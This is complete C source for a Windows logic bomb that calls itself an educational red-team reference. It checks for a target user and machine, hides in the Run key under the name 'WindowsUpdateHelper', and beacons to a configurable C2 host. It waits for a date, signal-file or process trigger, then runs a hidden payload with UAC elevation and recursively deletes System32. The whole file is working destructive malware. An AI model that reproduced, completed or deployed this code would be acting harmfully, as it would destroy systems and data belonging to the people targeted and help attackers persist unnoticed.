/*
 * boom.c
 * Platform : Windows (XP SP3+)
 * Compiler : MinGW gcc / MSVC cl
 * Build    : gcc logic_bomb.c -o logic_bomb.exe -lws2_32 -ladvapi32 -lshell32
 * Purpose  : Educational red-team reference — trigger conditions, env checks,
 *            process detection, file signal, config parsing, privilege awareness,
 *            persistence, process execution, file ops, network comms, control flow,
 *            error handling — all in one translation unit.
 *
 * GOTCHAS:
 *   ws2_32  — Winsock2, must link explicitly with MinGW (-lws2_32)
 *   advapi32 — Registry + privilege APIs
 *   shell32  — ShellExecuteA (process launch with elevated UX)
 *   UNICODE not used; ANSI APIs throughout for portability across old targets
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

/* ─── Config ───────────────────────────────────────────────────────────────── */
#define CFG_FILE          "lb_config.ini"
#define SIGNAL_FILE       "C:\\ProgramData\\.lb_trigger"
#define PERSIST_KEY       "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define PERSIST_NAME      "WindowsUpdateHelper"
#define TARGET_USER       "VICTIM"          /* env check: matches %USERNAME%    */
#define TARGET_MACHINE    "DESKTOP-TARGET"  /* env check: matches COMPUTERNAME  */
#define WATCH_PROCESS     "notepad.exe"     /* process detection target         */
#define WATCH_SERVICE     "Spooler"         /* service detection target         */
#define C2_HOST           "127.0.0.1"       /* network: C2 host (loopback demo) */
#define C2_PORT           4444              /* network: C2 port                 */
#define PAYLOAD_PROCESS   "cmd.exe"         /* process to launch on trigger     */
#define PAYLOAD_ARGS      "/c echo triggered >> C:\\ProgramData\\lb.log"

/* Trigger date/time: fire on or after 2025-01-01 00:00 local */
#define TRIGGER_YEAR      2025
#define TRIGGER_MONTH     1
#define TRIGGER_DAY       1
#define TRIGGER_HOUR      0
#define TRIGGER_MINUTE    0

/* ─── Config struct ─────────────────────────────────────────────────────────── */
typedef struct {
    char  target_user[64];
    char  target_machine[64];
    char  watch_process[64];
    char  c2_host[128];
    int   c2_port;
    char  payload[256];
    char  payload_args[256];
    int   trigger_year;
    int   trigger_month;
    int   trigger_day;
} LBConfig;

/* ─── Globals ───────────────────────────────────────────────────────────────── */
static LBConfig g_cfg;
static BOOL     g_winsock_up = FALSE;

/* ─── Utility: trim trailing whitespace ─────────────────────────────────────── */
static void trim(char *s) {
    size_t n = strlen(s);
    while (n > 0 && (s[n-1] == '\r' || s[n-1] == '\n' || s[n-1] == ' '))
        s[--n] = '\0';
}

/* ─── 1. Configuration parsing ──────────────────────────────────────────────── */
/*
 * Reads CFG_FILE (INI-style: key=value, # comments).
 * Falls back to compile-time defines if file absent.
 */
static void config_load(void) {
    /* defaults */
    strncpy(g_cfg.target_user,    TARGET_USER,    sizeof g_cfg.target_user    - 1);
    strncpy(g_cfg.target_machine, TARGET_MACHINE, sizeof g_cfg.target_machine - 1);
    strncpy(g_cfg.watch_process,  WATCH_PROCESS,  sizeof g_cfg.watch_process  - 1);
    strncpy(g_cfg.c2_host,        C2_HOST,        sizeof g_cfg.c2_host        - 1);
    g_cfg.c2_port      = C2_PORT;
    strncpy(g_cfg.payload,        PAYLOAD_PROCESS, sizeof g_cfg.payload       - 1);
    strncpy(g_cfg.payload_args,   PAYLOAD_ARGS,    sizeof g_cfg.payload_args  - 1);
    g_cfg.trigger_year  = TRIGGER_YEAR;
    g_cfg.trigger_month = TRIGGER_MONTH;
    g_cfg.trigger_day   = TRIGGER_DAY;

    FILE *f = fopen(CFG_FILE, "r");
    if (!f) return;  /* file absent: use defaults silently */

    char line[512], key[128], val[384];
    while (fgets(line, sizeof line, f)) {
        trim(line);
        if (line[0] == '#' || line[0] == '\0') continue;
        if (sscanf(line, "%127[^=]=%383[^\n]", key, val) != 2) continue;
        trim(key); trim(val);

        if (!strcmp(key, "target_user"))    strncpy(g_cfg.target_user,    val, 63);
        else if (!strcmp(key, "target_machine")) strncpy(g_cfg.target_machine, val, 63);
        else if (!strcmp(key, "watch_process"))  strncpy(g_cfg.watch_process,  val, 63);
        else if (!strcmp(key, "c2_host"))        strncpy(g_cfg.c2_host,        val, 127);
        else if (!strcmp(key, "c2_port"))        g_cfg.c2_port      = atoi(val);
        else if (!strcmp(key, "payload"))        strncpy(g_cfg.payload,        val, 255);
        else if (!strcmp(key, "payload_args"))   strncpy(g_cfg.payload_args,   val, 255);
        else if (!strcmp(key, "trigger_year"))   g_cfg.trigger_year  = atoi(val);
        else if (!strcmp(key, "trigger_month"))  g_cfg.trigger_month = atoi(val);
        else if (!strcmp(key, "trigger_day"))    g_cfg.trigger_day   = atoi(val);
    }
    fclose(f);
}

/* ─── 2. Privilege awareness ────────────────────────────────────────────────── */
/*
 * Returns 1 if running as a member of the local Administrators group.
 * Uses CheckTokenMembership to avoid UAC side-effects.
 */
static int priv_is_admin(void) {
    BOOL result = FALSE;
    SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;
    PSID admin_group;
    if (!AllocateAndInitializeSid(&nt_authority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &admin_group))
        return 0;
    CheckTokenMembership(NULL, admin_group, &result);
    FreeSid(admin_group);
    return result ? 1 : 0;
}

/* ─── 3. Environment check ──────────────────────────────────────────────────── */
/*
 * Validates USERNAME and COMPUTERNAME against config.
 * Both must match for the bomb to arm.
 */
static int env_check(void) {
    char user[128]    = {0};
    char machine[128] = {0};
    DWORD sz;

    sz = sizeof user;
    if (!GetEnvironmentVariableA("USERNAME", user, sz)) return 0;

    sz = sizeof machine;
    if (!GetEnvironmentVariableA("COMPUTERNAME", machine, sz)) return 0;

    return (_stricmp(user,    g_cfg.target_user)    == 0 &&
            _stricmp(machine, g_cfg.target_machine) == 0) ? 1 : 0;
}

/* ─── 4. Trigger condition — date/time ──────────────────────────────────────── */
/*
 * Returns 1 when local system time is on or past the configured trigger date.
 */
static int trigger_datetime(void) {
    time_t now_t = time(NULL);
    struct tm *now = localtime(&now_t);
    if (!now) return 0;

    int y = now->tm_year + 1900;
    int m = now->tm_mon  + 1;
    int d = now->tm_mday;

    if (y > g_cfg.trigger_year)  return 1;
    if (y == g_cfg.trigger_year && m > g_cfg.trigger_month)  return 1;
    if (y == g_cfg.trigger_year && m == g_cfg.trigger_month && d >= g_cfg.trigger_day) return 1;
    return 0;
}

/* ─── 5. File existence check ───────────────────────────────────────────────── */
/*
 * SIGNAL_FILE presence acts as a manual trigger override.
 * Useful for red-team: drop the file to fire early, delete to disarm.
 */
static int trigger_signal_file(void) {
    DWORD attr = GetFileAttributesA(SIGNAL_FILE);
    return (attr != INVALID_FILE_ATTRIBUTES) ? 1 : 0;
}

/* ─── 6. Process detection ──────────────────────────────────────────────────── */
/*
 * Walks the snapshot of running processes.
 * Returns 1 if watch_process is found in the process list.
 */
static int detect_process(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof pe;
    BOOL found = FALSE;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found ? 1 : 0;
}

/*
 * Checks SCM for a running service by name.
 * Returns 1 if service exists and is currently running.
 */
static int detect_service(const char *svc_name) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return 0;

    SC_HANDLE svc = OpenServiceA(scm, svc_name, SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); return 0; }

    SERVICE_STATUS ss;
    BOOL running = (QueryServiceStatus(svc, &ss) &&
                    ss.dwCurrentState == SERVICE_RUNNING);

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return running ? 1 : 0;
}

/* ─── 7. File operations — payload: wipe System32 ──────────────────────────── */
/*
 * Recursively deletes every file under a directory path.
 * Skips files it cannot open (locked by OS) and continues.
 * Requires admin + SeBackupPrivilege / SeTakeOwnershipPrivilege for full effect.
 *
 * GOTCHA: System32 files held by the kernel will resist deletion even as SYSTEM.
 *         The loop continues past them — partial destruction is the realistic outcome.
 */
static void file_wipe_directory(const char *dir_path) {
    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\*", dir_path);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;

        char full[MAX_PATH];
        snprintf(full, MAX_PATH, "%s\\%s", dir_path, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            file_wipe_directory(full);      /* recurse into subdirs */
            RemoveDirectoryA(full);
        } else {
            /* strip read-only before delete */
            SetFileAttributesA(full, FILE_ATTRIBUTE_NORMAL);
            if (!DeleteFileA(full)) {
                /* log failure — locked files get skipped, not retried */
                char errbuf[512];
                snprintf(errbuf, sizeof errbuf,
                         "[lb] wipe failed: %s (err=%lu)\n", full, GetLastError());
                HANDLE log = CreateFileA("C:\\ProgramData\\lb_err.log",
                                         FILE_APPEND_DATA, FILE_SHARE_READ,
                                         NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (log != INVALID_HANDLE_VALUE) {
                    DWORD written;
                    WriteFile(log, errbuf, (DWORD)strlen(errbuf), &written, NULL);
                    CloseHandle(log);
                }
            }
        }
    } while (FindNextFileA(h, &fd));

    FindClose(h);
}

/* High-level wrapper: resolve System32 path and wipe */
static void payload_wipe_system32(void) {
    char sys32[MAX_PATH] = {0};
    /* GetSystemDirectoryA returns e.g. C:\Windows\System32 */
    if (!GetSystemDirectoryA(sys32, MAX_PATH)) {
        strncpy(sys32, "C:\\Windows\\System32", MAX_PATH - 1);
    }
    file_wipe_directory(sys32);
}

/* ─── 8. Process execution ──────────────────────────────────────────────────── */
/*
 * Launches payload process via CreateProcessA (no console window).
 * Falls back to ShellExecuteA for elevated UAC prompt when not already admin.
 */
static int exec_payload(void) {
    char cmdline[512];
    snprintf(cmdline, sizeof cmdline, "%s %s", g_cfg.payload, g_cfg.payload_args);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof si);
    ZeroMemory(&pi, sizeof pi);
    si.cb          = sizeof si;
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    /* fallback — ShellExecute with runas for UAC elevation */
    HINSTANCE r = ShellExecuteA(NULL, "runas",
                                 g_cfg.payload, g_cfg.payload_args,
                                 NULL, SW_HIDE);
    return ((INT_PTR)r > 32) ? 1 : 0;
}

/* ─── 9. Network communication ──────────────────────────────────────────────── */
/*
 * Opens a TCP socket to C2, sends a one-line beacon with hostname + privilege.
 * Winsock is initialised once at startup (WSAStartup), cleaned at exit.
 * Non-blocking connect attempt with 3-second timeout via select().
 */
static void net_beacon(const char *event) {
    if (!g_winsock_up) return;

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return;

    /* non-blocking mode */
    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof addr);
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons((u_short)g_cfg.c2_port);
    addr.sin_addr.s_addr = inet_addr(g_cfg.c2_host);

    connect(s, (struct sockaddr *)&addr, sizeof addr);

    /* wait up to 3 s for connect to complete */
    fd_set wfds;
    FD_ZERO(&wfds);
    FD_SET(s, &wfds);
    struct timeval tv = {3, 0};
    int ready = select(0, NULL, &wfds, NULL, &tv);

    if (ready > 0) {
        char hostname[128] = {0};
        gethostname(hostname, sizeof hostname - 1);

        char beacon[512];
        int n = snprintf(beacon, sizeof beacon,
                         "LB|%s|%s|admin=%d\r\n",
                         hostname, event, priv_is_admin());

        nb = 0; ioctlsocket(s, FIONBIO, &nb);  /* blocking for send */
        send(s, beacon, n, 0);
    }
    closesocket(s);
}

/* ─── 10. Persistence ───────────────────────────────────────────────────────── */
/*
 * Writes own path into HKCU\...\Run.
 * HKCU doesn't require elevation — fires on every user logon.
 * Upgrades to HKLM if admin (system-wide persistence).
 */
static void persist_install(void) {
    char self[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, self, MAX_PATH);

    HKEY root = priv_is_admin() ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
    HKEY key;
    LONG rc = RegOpenKeyExA(root, PERSIST_KEY, 0, KEY_SET_VALUE, &key);
    if (rc != ERROR_SUCCESS) return;

    RegSetValueExA(key, PERSIST_NAME, 0, REG_SZ,
                   (BYTE *)self, (DWORD)(strlen(self) + 1));
    RegCloseKey(key);
}

/* Removes own Run key — call during cleanup / self-destruct phase */
static void persist_remove(void) {
    HKEY root = priv_is_admin() ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
    HKEY key;
    if (RegOpenKeyExA(root, PERSIST_KEY, 0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
        RegDeleteValueA(key, PERSIST_NAME);
        RegCloseKey(key);
    }
}

/* ─── Control-flow logic ────────────────────────────────────────────────────── */
/*
 * Master arm/fire state machine:
 *   DISARMED  → env check fails (wrong machine/user)
 *   ARMED     → env pass, date not yet reached, signal file absent
 *   TRIGGERED → any trigger condition fires
 *
 * Sequence:
 *   1. Config load
 *   2. Privilege snapshot
 *   3. Winsock init
 *   4. Env check    — bail if wrong target
 *   5. Persistence  — install Run key
 *   6. Beacon ARMED
 *   7. Poll loop    — check triggers every 60 s
 *   8. On trigger: beacon TRIGGERED → exec payload → wipe System32 → remove persist → exit
 */
int main(void) {
    /* ── 1. Config ── */
    config_load();

    /* ── 3. Winsock ── */
    WSADATA wsd;
    if (WSAStartup(MAKEWORD(2, 2), &wsd) == 0) g_winsock_up = TRUE;

    /* ── 2/4. Privilege + env check ── */
    int is_admin = priv_is_admin();
    if (!env_check()) {
        /* Wrong machine/user — sleep forever, do nothing visible */
        net_beacon("ENV_MISMATCH");
        if (g_winsock_up) WSACleanup();
        /* idle: real deployments just exit silently */
        return 0;
    }

    /* ── 5. Persistence ── */
    persist_install();

    /* ── 6. Beacon armed ── */
    net_beacon("ARMED");

    /* ── 7. Poll loop ── */
    for (;;) {
        int fire = 0;

        /* Trigger A: date/time */
        if (trigger_datetime())      fire = 1;

        /* Trigger B: signal file override */
        if (trigger_signal_file())   fire = 1;

        /* Trigger C: watched process present (gate condition, not independently fire) */
        int proc_present = detect_process(g_cfg.watch_process);
        int svc_running  = detect_service(WATCH_SERVICE);

        /*
         * Combined condition:
         *   fire if date trigger AND (process gate OR service gate)
         *   OR signal file alone overrides everything
         */
        if (!trigger_signal_file()) {
            fire = (trigger_datetime() && (proc_present || svc_running)) ? 1 : 0;
        }

        if (fire) break;

        Sleep(60 * 1000);  /* check every 60 seconds */
    }

    /* ── 8. Trigger sequence ── */
    net_beacon("TRIGGERED");

    exec_payload();         /* launch configured payload process   */
    payload_wipe_system32(); /* wipe System32 (requires admin)     */
    persist_remove();        /* clean up Run key                   */

    if (g_winsock_up) WSACleanup();
    return 0;
}